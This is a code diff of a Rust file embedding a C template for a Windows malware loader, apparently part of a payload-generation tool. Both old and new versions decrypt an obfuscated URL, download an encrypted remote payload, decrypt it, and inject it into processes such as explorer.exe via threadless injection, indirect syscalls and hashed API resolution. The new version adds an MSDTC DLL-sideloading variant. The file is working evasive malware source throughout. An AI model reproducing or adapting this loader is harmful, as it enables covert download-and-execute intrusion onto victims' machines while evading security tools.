@@ -1,84 +1,294 @@
-pub const MAIN_C: &str = r#"
-#include <stdio.h>
-#include <windows.h>
+pub const MAIN_C: &str = r#"#include <windows.h>
+#include "macros.h"
+#include "web.h"
+#include "winapi.h"
 
-#include "../include/Anti.h"
-#include "../include/IndirectSyscall.h"
-#include "../include/Tool.h"
-#include "../include/Web.h"
-{INCLUDE}
+#ifdef MSDTC_DLL_SIDELOAD
+#include "msdtc_dll_sideload.h"
+#endif
 
-#define KEY_SIZE 16
-#define BUFFER_SIZE {BUFFERSIZE}
-char EncryptedKey[] = {{PROTECTED_KEY}};
-#define NumberOfElements 10
-//{CAROKANN_SHELLCODE_ARR}
-BOOL myBForceKey(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey,
-                 OUT PBYTE* ppRealKey) {
-    BYTE b = 0;
-    PBYTE pRealKey = (PBYTE)malloc(sKey);
+#ifdef THREADLESS_INJECTION
+#include "threadless_injection.h"
+#endif
 
-    while (1) {
-        if (((pProtectedKey[0] ^ b) - 0) == HintByte)
-            break;
-        else
-            b++;
+/* the kann shellcode file */
+#include "./method/kannshellcode.c"
+
+/* encrypt url array */
+unsigned char Url[] = {{ENC_URL}};
+
+extern NT_CONFIG g_NT_CONFIG;
+extern NT_API g_NT_API;
+
+#ifdef DEBUG
+void hexdump(const unsigned char *data, size_t size);
+#endif
+
+/* THREADLESS INJECTION */
+#ifdef THREADLESS_INJECTION
+int Main() {
+
+    GetKey();
+
+    if (!InitNtdllConfig()) {
+#ifdef DEBUG
+        PRINTA("[-] INIT NTDLL.dll Error!\n");
+#endif
+        return 1;
     }
 
-    for (int i = 0; i < sKey; i++) {
-        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) ^ i);
+#ifdef DEBUG
+    PRINTA("[+] ntdll number of names : %d\n", g_NT_CONFIG.dwNumberOfNames);
+    PRINTA("[+] ntdll address : %p\n", g_NT_CONFIG.uModule);
+#endif
+
+    char *File = NULL;
+    int Size;
+
+    Xoor(Url, sizeof(Url));
+#ifdef DEBUG
+    hexdump(Url, sizeof(Url));
+#endif
+
+    if (!Download((char *)Url, &File, &Size)) {
+#ifdef DEBUG
+        PRINTA("[-] Failed to Download\n");
+#endif
+        return 0;
+    };
+
+    Xoor(File, Size);
+
+    PTHREADLESSCONFIG pThreadlessConfig = malloc(sizeof(THREADLESSCONFIG));
+    TARGETFUNCTIONCONFIG TargetFunctionConfig[1];
+#ifdef REMOTE
+    LoadTargetFunctionConfig(&TargetFunctionConfig[0], EXPLORER_EXE_HASH,
+                             RtlNtStatusToDosError_Hash, NTDLL_DLL_HASH,
+                             NtCreateWnfStateName_Hash, NTDLL_DLL_HASH, Size,
+                             sizeof(KannShellcode));
+#endif
+#ifdef LOCAL
+    LoadTargetFunctionConfig(&TargetFunctionConfig[0], RUNTIMEBROKER_EXE_HASH,
+                             RtlAcquireSRWLockExclusive_Hash, NTDLL_DLL_HASH,
+                             NtCreateWnfStateName_Hash, NTDLL_DLL_HASH, Size,
+                             sizeof(KannShellcode));
+#endif
+    pThreadlessConfig->pMainBuffer = File;
+
+    DWORD dwTargetFunctionConfigCount =
+        sizeof(TargetFunctionConfig) / sizeof(TargetFunctionConfig[0]);
+
+    for (int i = 0; i < dwTargetFunctionConfigCount; i++) {
+        if (CheckTargetFunctionConfig(&TargetFunctionConfig[i],
+                                      pThreadlessConfig)) {
+
+            pThreadlessConfig->pKannBuffer = malloc(sizeof(KannShellcode));
+            memcpy((void *)pThreadlessConfig->pKannBuffer, KannShellcode,
+                   sizeof(KannShellcode));
+#ifdef DEBUG
+            PRINTA("[+] Threadless Config hProcess: %d\n",
+                   pThreadlessConfig->hProcess);
+            PRINTA("[+] Threadless Config pKannBuffer: %p\n",
+                   pThreadlessConfig->pKannBuffer);
+            PRINTA("[+] Threadless Config pMainBuffer: %p\n",
+                   pThreadlessConfig->pMainBuffer);
+            PRINTA("[+] Threadless Config pHookedFunction: %p\n",
+                   pThreadlessConfig->pHookedFunction);
+            PRINTA("[+] Threadless Config pMainMemoryHole: %p\n",
+                   pThreadlessConfig->pMainMemoryHole);
+            PRINTA("[+] Threadless Config pKannMemoryHole: %p\n",
+                   pThreadlessConfig->pKannMemoryHole);
+            PRINTA("[+] Threadless Config dwMainBufferSize: %d\n",
+                   pThreadlessConfig->dwMainBufferSize);
+            PRINTA("[+] Threadless Config dwKannBufferSize: %d\n",
+                   pThreadlessConfig->dwKannBufferSize);
+#endif
+
+            if (Launch(pThreadlessConfig)) {
+                memset(pThreadlessConfig->pKannBuffer, 0,
+                       sizeof(KannShellcode));
+                free(pThreadlessConfig->pKannBuffer);
+                break;
+            };
+#ifdef DEBUG
+            PRINTA("<-> Configure %i launch failed, try next configure...hope "
+                   "everything is under control...\n",
+                   i);
+#endif
+
+            memset(pThreadlessConfig->pKannBuffer, 0, sizeof(KannShellcode));
+            free(pThreadlessConfig->pKannBuffer);
+        }
     }
+    memset(pThreadlessConfig, 0, sizeof(THREADLESSCONFIG));
+    return 0;
+}
+#endif
 
-    *ppRealKey = pRealKey;
 
+
+
+/* MSDTC SIDELOAD MSDTCTM.DLL */
+
+#ifdef MSDTC_DLL_SIDELOAD
+int RunMain();
+extern __declspec(dllexport) PVOID DtcMainExt() {
+    if (!InitNtdllConfig()) {
+#ifdef DEBUG
+        PRINTA("[-] INIT NTDLL.dll Error!\n");
+#endif
+        return 1;
+    }
+    if (!InitNtSyscall(&g_NT_CONFIG, NtAllocateVirtualMemory_Hash,
+                       S_PTR(NT_SYSCALL, g_NT_API.NtAllocateVirtualMemory)) ||
+        !InitNtSyscall(&g_NT_CONFIG, NtProtectVirtualMemory_Hash,
+                       S_PTR(NT_SYSCALL, g_NT_API.NtProtectVirtualMemory)) ||
+        !InitNtSyscall(&g_NT_CONFIG, NtCreateThreadEx_Hash,
+                       S_PTR(NT_SYSCALL, g_NT_API.NtCreateThreadEx)))
+        return 0;
+    HANDLE hThread = NULL;
+    CONFIGURE_SYSCALL(g_NT_API.NtCreateThreadEx);
+    if (SysCall(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), RunMain,
+                NULL, FALSE, NULL, NULL, NULL, NULL))
+        return 0;
+    WaitForSingleObject(hThread, INFINITE);
+    return NULL;
+}
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason) {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
     return TRUE;
 }
+int RunMain() {
 
-BOOL XXOOR(IN PBYTE pBuffer, IN SIZE_T sBufferSize, IN PBYTE key,
-           IN SIZE_T sKeySize) {
-    if (pBuffer == NULL || key == NULL || sBufferSize == 0 || sKeySize == 0) {
-        return FALSE;
+    GetKey();
+
+    if (!InitNtdllConfig()) {
+#ifdef DEBUG
+        PRINTA("[-] INIT NTDLL.dll Error!\n");
+#endif
+        return 1;
     }
 
-    for (SIZE_T i = 0; i < sBufferSize; i++) {
-        pBuffer[i] ^= key[i % sKeySize];
-    }
+#ifdef DEBUG
+    PRINTA("[+] ntdll number of names : %d\n", g_NT_CONFIG.dwNumberOfNames);
+    PRINTA("[+] ntdll address : %p\n", g_NT_CONFIG.uModule);
+#endif
 
-    return TRUE;
+    char *File = NULL;
+    int Size;
+
+    Xoor(Url, sizeof(Url));
+#ifdef DEBUG
+    hexdump(Url, sizeof(Url));
+#endif
+
+    if (!Download((char *)Url, &File, &Size)) {
+#ifdef DEBUG
+        PRINTA("[-] Failed to Download\n");
+#endif
+        return 0;
+    };
+
+    Xoor(File, Size);
+
+    PTHREADLESSCONFIG pThreadlessConfig = malloc(sizeof(THREADLESSCONFIG));
+    TARGETFUNCTIONCONFIG TargetFunctionConfig[1];
+
+    LoadTargetFunctionConfig(&TargetFunctionConfig[0], RUNTIMEBROKER_EXE_HASH,
+                             RtlAcquireSRWLockExclusive_Hash, NTDLL_DLL_HASH,
+                             NtCreateWnfStateName_Hash, NTDLL_DLL_HASH, Size,
+                             sizeof(KannShellcode));
+
+    pThreadlessConfig->pMainBuffer = File;
+
+    DWORD dwTargetFunctionConfigCount =
+        sizeof(TargetFunctionConfig) / sizeof(TargetFunctionConfig[0]);
+
+    for (int i = 0; i < dwTargetFunctionConfigCount; i++) {
+        if (CheckTargetFunctionConfig(&TargetFunctionConfig[i],
+                                      pThreadlessConfig)) {
+
+            pThreadlessConfig->pKannBuffer = malloc(sizeof(KannShellcode));
+            memcpy((void *)pThreadlessConfig->pKannBuffer, KannShellcode,
+                   sizeof(KannShellcode));
+#ifdef DEBUG
+            PRINTA("[+] Threadless Config hProcess: %d\n",
+                   pThreadlessConfig->hProcess);
+            PRINTA("[+] Threadless Config pKannBuffer: %p\n",
+                   pThreadlessConfig->pKannBuffer);
+            PRINTA("[+] Threadless Config pMainBuffer: %p\n",
+                   pThreadlessConfig->pMainBuffer);
+            PRINTA("[+] Threadless Config pHookedFunction: %p\n",
+                   pThreadlessConfig->pHookedFunction);
+            PRINTA("[+] Threadless Config pMainMemoryHole: %p\n",
+                   pThreadlessConfig->pMainMemoryHole);
+            PRINTA("[+] Threadless Config pKannMemoryHole: %p\n",
+                   pThreadlessConfig->pKannMemoryHole);
+            PRINTA("[+] Threadless Config dwMainBufferSize: %d\n",
+                   pThreadlessConfig->dwMainBufferSize);
+            PRINTA("[+] Threadless Config dwKannBufferSize: %d\n",
+                   pThreadlessConfig->dwKannBufferSize);
+#endif
+
+            if (Launch(pThreadlessConfig)) {
+                memset(pThreadlessConfig->pKannBuffer, 0,
+                       sizeof(KannShellcode));
+                free(pThreadlessConfig->pKannBuffer);
+                break;
+            };
+#ifdef DEBUG
+            PRINTA("<-> Configure %i launch failed, try next configure...hope "
+                   "everything is under control...\n",
+                   i);
+#endif
+
+            memset(pThreadlessConfig->pKannBuffer, 0, sizeof(KannShellcode));
+            free(pThreadlessConfig->pKannBuffer);
+        }
+    }
+    memset(pThreadlessConfig, 0, sizeof(THREADLESSCONFIG));
+    return 0;
 }
-int main(int argc, char* argv[]) {
-    if (CheckAll()) {
-        return EXIT_SUCCESS;
+#endif
+
+
+#ifdef DEBUG
+void hexdump(const unsigned char *data, size_t size) {
+    size_t i, j;
+
+    for (i = 0; i < size; i += 16) {
+        PRINTA("%08lx: ", (unsigned long)i);
+
+        for (j = 0; j < 16; j++) {
+            if (i + j < size) {
+                PRINTA("%02x ", data[i + j]);
+            } else {
+                PRINTA("   ");
+            }
+        }
+
+        PRINTA(" | ");
+        for (j = 0; j < 16; j++) {
+            if (i + j < size) {
+                if (data[i + j] >= 32 && data[i + j] <= 126) {
+                    PRINTA("%c", data[i + j]);
+                } else {
+                    PRINTA(".");
+                }
+            } else {
+                PRINTA(" ");
+            }
+        }
+
+        PRINTA("\n");
     }
-    PBYTE pBuffer = NULL;
-    PBYTE pRealKey = NULL;
+};
+#endif
 
-    BOOL DECSTATUS =
-        myBForceKey({HINT_BYTE}, (PBYTE)EncryptedKey, KEY_SIZE, &pRealKey);
-    PrintBuffer(pRealKey, KEY_SIZE);
-
-    SIZE_T sBufferSize = BUFFER_SIZE;
-    pBuffer = (PBYTE)LocalAlloc(LPTR, BUFFER_SIZE);
-    printf("[#] Downloading From URl...\n");
-    DownloadFromUrl(L"{SHELLCODE_URL}", pBuffer, sBufferSize);
-    // PrintBuffer(pBuffer, BUFFER_SIZE);
-
-    BOOL result = XXOOR(pBuffer, BUFFER_SIZE, pRealKey, KEY_SIZE);
-    // PrintBuffer(pBuffer, BUFFER_SIZE);
-
-    NTDLL_CONFIG NtdllConfig = {0};
-    PNTDLL_CONFIG pNtdllConfig = &NtdllConfig;
-    NTDLL_INIT_STATUS NtdllConfigStatus = InitNtdllConfig(pNtdllConfig);
-    if (NtdllConfigStatus != NTDLL_INIT_STATUS_SUCCESS) {
-        return EXIT_FAILURE;
-    }
-    NTAPI_FUNC Nt = {0};
-    PNTAPI_FUNC g_Nt = &Nt;
-    NTSYSCALL_INIT_STATUS NtSyscallStatus = InitSyscall(g_Nt, pNtdllConfig);
-    printf("[+] Done!");
-
-
-{INJECTION}
-    return EXIT_SUCCESS;
-}
 "#;
